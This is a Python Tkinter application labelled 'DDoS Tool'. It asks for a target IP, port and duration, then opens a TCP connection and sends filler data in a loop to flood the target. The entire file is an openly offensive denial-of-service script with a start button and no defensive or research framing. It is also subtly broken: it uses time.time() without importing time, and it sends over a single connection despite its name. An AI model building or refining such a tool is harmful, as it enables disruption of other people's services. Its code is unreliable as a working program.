import tkinter as tk
from tkinter import ttk
import threading
import socket

class DDoSApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("DDoS Tool")
        self.geometry("400x250")
        self.configure(bg="#f0f0f0")
        self.resizable(False, False)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#f0f0f0", font=("Helvetica", 12))
        style.configure("TButton", font=("Helvetica", 12))

        ttk.Label(self, text="DDoS Tool", font=("Helvetica", 20)).pack(pady=10)

        self.entry_ip = self.create_entry("Target IP:")
        self.entry_port = self.create_entry("Target Port:", pady=(10, 0))
        self.entry_duration = self.create_entry("Duration (seconds):", pady=(10, 0))

        ttk.Button(self, text="Start DDoS", command=self.start_ddos).pack(pady=(20,10), fill=tk.X)

    def create_entry(self, label_text, **kwargs):
        frame = ttk.Frame(self, padding=(20, 0))
        frame.pack(fill=tk.X, **kwargs)
        ttk.Label(frame, text=label_text).pack(side=tk.LEFT)
        entry = ttk.Entry(frame)
        entry.pack(side=tk.RIGHT, fill=tk.X, expand=True)
        return entry

    def start_ddos(self):
        target_ip = self.entry_ip.get()
        target_port = int(self.entry_port.get())
        duration = int(self.entry_duration.get())
        threading.Thread(target=self.ddos, args=(target_ip, target_port, duration)).start()

    def ddos(self, target_ip, target_port, duration):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            print(f"DDoS attack started on {target_ip}:{target_port} for {duration} seconds")
            start_time = time.time()
            while (time.time() - start_time) < duration:
                s.send(b'Data to flood the target with...')
            s.close()
            print("DDoS attack finished.")
        except Exception as e:
            print("Error: ", e)

if __name__ == "__main__":
    app = DDoSApp()
    app.mainloop()
